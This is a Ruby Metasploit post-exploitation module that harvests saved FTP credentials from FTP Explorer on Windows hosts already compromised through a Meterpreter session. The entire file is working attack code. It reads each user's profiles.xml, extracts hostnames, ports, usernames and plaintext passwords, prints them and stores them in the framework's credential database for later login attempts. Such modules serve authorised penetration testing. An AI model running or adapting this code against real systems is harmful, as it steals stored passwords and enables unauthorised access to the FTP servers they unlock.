##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather FTP Explorer (FTPX) Credential Extraction',
      'Description'   => %q{
        This module finds saved login credentials for the FTP Explorer (FTPx)
        FTP client for Windows.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    grab_user_profiles().each do |user|
      next if user['AppData'].nil?

      xml = get_xml(user['AppData'] + "\\FTP Explorer\\profiles.xml")
      unless xml.nil?
        parse_xml(xml)
      end
    end
  end

  def get_xml(path)
    begin
      connections = client.fs.file.new(path, 'r')

      condata = ''
      until connections.eof
        condata << connections.read
      end
      return condata
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error "Error when reading #{path} (#{e.message})"
      return nil
    end
  end

  # Extracts the saved connection data from the XML.
  # Reports the credentials back to the database.
  def parse_xml(data)
    mxml = REXML::Document.new(data).root
    mxml.elements.to_a("//FTPx10//Profiles//").each.each do |node|
      next if node.elements['Host'].nil?
      next if node.elements['Login'].nil?
      next if node.elements['Password'].nil?

      host = node.elements['Host'].text
      port = node.elements['Port'].text
      user = node.elements['Login'].text
      pass = node.elements['Password'].text

      # skip blank passwords
      next if !pass or pass.empty?

      # show results to the user
      print_good("#{session.sock.peerhost}:#{port} (#{host}) - '#{user}:#{pass}'")

      # save results to the db
      service_data = {
        address: Rex::Socket.getaddress(host),
        port: port,
        protocol: "tcp",
        service_name: "ftp",
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        username: user,
        private_data: pass,
        private_type: :password
      }

      credential_core = create_credential(credential_data.merge(service_data))

      login_data = {
        core: credential_core,
        access_level: "User",
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      create_credential_login(login_data.merge(service_data))
    end
  end
end
